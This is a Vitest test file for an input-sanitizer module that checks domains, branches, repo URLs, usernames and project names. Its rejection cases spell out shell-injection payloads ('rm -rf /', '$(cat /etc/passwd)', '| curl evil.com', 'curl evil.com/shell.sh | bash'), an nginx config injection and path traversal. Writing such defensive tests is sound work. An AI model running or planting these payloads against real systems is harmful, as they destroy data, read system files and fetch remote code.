import { describe, it, expect } from 'vitest';

const { isValidDomain, isValidBranch, isValidRepoUrl, isValidUsername, isValidProjectName } = await import('./input-sanitizer.js');

describe('Input Sanitizer', () => {
  describe('isValidDomain', () => {
    it('accepts valid domains', () => {
      expect(isValidDomain('example.com')).toBe(true);
      expect(isValidDomain('myapp.dev')).toBe(true);
      expect(isValidDomain('sub.domain.example.com')).toBe(true);
      expect(isValidDomain('a.io')).toBe(true);
    });

    it('rejects domains with shell metacharacters', () => {
      expect(isValidDomain('example.com; rm -rf /')).toBe(false);
      expect(isValidDomain('example.com`whoami`')).toBe(false);
      expect(isValidDomain('example.com$(cat /etc/passwd)')).toBe(false);
      expect(isValidDomain('example.com | curl evil.com')).toBe(false);
    });

    it('rejects nginx injection attempts', () => {
      expect(isValidDomain('myapp.dev; include /etc/passwd;')).toBe(false);
      expect(isValidDomain('myapp.dev\nserver_name evil.com')).toBe(false);
    });

    it('rejects empty/null/undefined', () => {
      expect(isValidDomain('')).toBe(false);
      expect(isValidDomain(null)).toBe(false);
      expect(isValidDomain(undefined)).toBe(false);
    });
  });

  describe('isValidBranch', () => {
    it('accepts valid branch names', () => {
      expect(isValidBranch('main')).toBe(true);
      expect(isValidBranch('feature/login')).toBe(true);
      expect(isValidBranch('fix-bug-123')).toBe(true);
      expect(isValidBranch('release/v1.0.0')).toBe(true);
    });

    it('rejects branches with shell metacharacters', () => {
      expect(isValidBranch('main; rm -rf /')).toBe(false);
      expect(isValidBranch('main`whoami`')).toBe(false);
      expect(isValidBranch('main$(cat /etc/passwd)')).toBe(false);
      expect(isValidBranch('main | curl evil.com')).toBe(false);
    });

    it('rejects path traversal', () => {
      expect(isValidBranch('../../../etc/passwd')).toBe(false);
    });

    it('rejects empty/null', () => {
      expect(isValidBranch('')).toBe(false);
      expect(isValidBranch(null)).toBe(false);
    });
  });

  describe('isValidRepoUrl', () => {
    it('accepts valid git URLs', () => {
      expect(isValidRepoUrl('git@github.com:user/repo.git')).toBe(true);
      expect(isValidRepoUrl('https://github.com/user/repo.git')).toBe(true);
      expect(isValidRepoUrl('https://github.com/user/repo')).toBe(true);
    });

    it('rejects injection attempts', () => {
      expect(isValidRepoUrl('; curl evil.com/shell.sh | bash;')).toBe(false);
      expect(isValidRepoUrl('git@github.com:user/repo.git; rm -rf /')).toBe(false);
      expect(isValidRepoUrl('$(whoami)')).toBe(false);
    });

    it('rejects empty/null', () => {
      expect(isValidRepoUrl('')).toBe(false);
      expect(isValidRepoUrl(null)).toBe(false);
    });
  });

  describe('isValidUsername', () => {
    it('accepts valid usernames', () => {
      expect(isValidUsername('deploy')).toBe(true);
      expect(isValidUsername('_admin')).toBe(true);
      expect(isValidUsername('deploy-user')).toBe(true);
    });

    it('rejects injection attempts', () => {
      expect(isValidUsername('deploy; rm -rf /')).toBe(false);
      expect(isValidUsername('deploy`whoami`')).toBe(false);
    });

    it('rejects empty/null', () => {
      expect(isValidUsername('')).toBe(false);
      expect(isValidUsername(null)).toBe(false);
    });
  });

  describe('isValidProjectName', () => {
    it('accepts valid project names', () => {
      expect(isValidProjectName('myapp')).toBe(true);
      expect(isValidProjectName('my-app')).toBe(true);
      expect(isValidProjectName('my_app.v2')).toBe(true);
    });

    it('rejects path traversal', () => {
      expect(isValidProjectName('../etc/passwd')).toBe(false);
      expect(isValidProjectName('foo/bar')).toBe(false);
    });

    it('rejects injection attempts', () => {
      expect(isValidProjectName('myapp; rm -rf /')).toBe(false);
      expect(isValidProjectName('myapp$(whoami)')).toBe(false);
    });

    it('rejects empty/null', () => {
      expect(isValidProjectName('')).toBe(false);
      expect(isValidProjectName(null)).toBe(false);
    });
  });
});
